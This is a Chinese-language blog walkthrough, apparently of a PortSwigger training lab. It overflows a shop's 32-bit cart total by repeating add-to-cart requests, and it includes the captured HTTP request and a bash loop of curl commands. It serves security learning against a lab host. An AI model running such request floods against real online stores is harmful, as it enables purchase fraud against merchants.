---
layout: post
title: "Low-level logic flaw"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_Business_Logic
author: ""
tags: ['PortSwigger_Lab', 'Business_Logic']
---





# Low-level logic flaw

低級邏輯缺陷


登入:
credentials: `wiener:peter`


目標:
```
buy a "Lightweight l33t leather jacket".
```



進去到 l33t 頁面，然後抓包 add to cart 的請求。


```http
POST /cart HTTP/1.1
Host: 0ab500560432e84fc0fa809e00d80026.web-security-academy.net
Cookie: session=wwghWaOVTzQjjMDgegFViFP4ToEs4C8m
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: https://0ab500560432e84fc0fa809e00d80026.web-security-academy.net
Referer: https://0ab500560432e84fc0fa809e00d80026.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

productId=1&redir=PRODUCT&quantity=1

```



這次使用整數溢出漏洞。

溢出原理:
https://zh.wikipedia.org/zh-tw/%E6%95%B4%E6%95%B0_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6)


先拿去repeater 測試。

測試 quantity 負數 -1 -2.....

發現沒變化。(大概是後端規定不能小於0)



抓包修改，發現 quantity得值 也不是能隨意修改。


前端和後端都有過慮，最大值為99


所以我們只能一次發送99數量的封包。


計算時間:

32bit:

```
範圍
2147483647   - −21474836.48

我們要溢出到負數在到接近零，所以要把數字相加
42949672.95


l33t leather jacket 一件 1337元

42949672/1337
=32123 

大約要買32123 件才會接近0


而一次能買99件
32123/99
=324


所以大約要發送
324個包



```



拿去intruder ，然後發送 null payload 


payload option:
continue indefinitely
(持續發送)

這時 可以刷新 cart 的頁面，去看看有沒有溢出。


剩下的就是時間問題，不過未來應該寫一個工具。
不然bp 免費版 intruder 慢死了。


///////////////////////////////////////////////////////////////////////////////////


另外 有關於爬蟲，或是其他工具 送出包的時候

header 加上double quote 的線上工具:
https://onlinelisttools.com/quote-list-items

使用:
在 item joiner 加上 :

input seperator 加上 :

至於空格可以交給sublime 刪除。


///////////////////////////////////////////////////////////////////////////////////


postman

可以使用bp 的外掛:
postman intergration

然後送給postman 的runner

不過還是太慢





最後使用了組合技加快速度:

1.借助 bp 的外掛postman intergration然後輸入到postman 
2.postman 轉換成 curl 指令
3.postman 可以用自己的runner 來loop
4.linux 也可以用 bash 來loop curl 指令 (然後多開命令列 達到多線程)

(總之一個工具負責100個)

postman curl:

```bash

curl --location --request POST 'https://0a4200ec031be382c0b2671600af0011.web-security-academy.net/cart' \
--header 'Host: 0a4200ec031be382c0b2671600af0011.web-security-academy.net' \
--header 'Cookie: session=GzpvkoDR19JyfmsZfO6QookAdvXD7deT' \
--header 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0' \
--header 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
--header 'Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--header 'Origin: https://0a4200ec031be382c0b2671600af0011.web-security-academy.net' \
--header 'Referer: https://0a4200ec031be382c0b2671600af0011.web-security-academy.net/product?productId=1' \
--header 'Upgrade-Insecure-Requests: 1' \
--header 'Sec-Fetch-Dest: document' \
--header 'Sec-Fetch-Mode: navigate' \
--header 'Sec-Fetch-Site: same-origin' \
--header 'Sec-Fetch-User: ?1' \
--header 'Te: trailers' \
--data-urlencode 'productId=1' \
--data-urlencode 'redir=PRODUCT' \
--data-urlencode 'quantity=99'

```



linux bash loop curl 指令
```bash

for i in {1..100}
do

	curl --location --request POST 'https://0a4200ec031be382c0b2671600af0011.web-security-academy.net/cart' \
--header 'Host: 0a4200ec031be382c0b2671600af0011.web-security-academy.net' \
--header 'Cookie: session=GzpvkoDR19JyfmsZfO6QookAdvXD7deT' \
--header 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0' \
--header 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
--header 'Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--header 'Origin: https://0a4200ec031be382c0b2671600af0011.web-security-academy.net' \
--header 'Referer: https://0a4200ec031be382c0b2671600af0011.web-security-academy.net/product?productId=1' \
--header 'Upgrade-Insecure-Requests: 1' \
--header 'Sec-Fetch-Dest: document' \
--header 'Sec-Fetch-Mode: navigate' \
--header 'Sec-Fetch-Site: same-origin' \
--header 'Sec-Fetch-User: ?1' \
--header 'Te: trailers' \
--data-urlencode 'productId=1' \
--data-urlencode 'redir=PRODUCT' \
--data-urlencode 'quantity=99'


done




```


最後結果:

```
Lightweight "l33t" Leather Jacket  $1337.00  32123 
32123件



Gym Suit  $65.09  19 
19件


Total:  $14.75


```

100元可以購買1337的品項 

只花了14元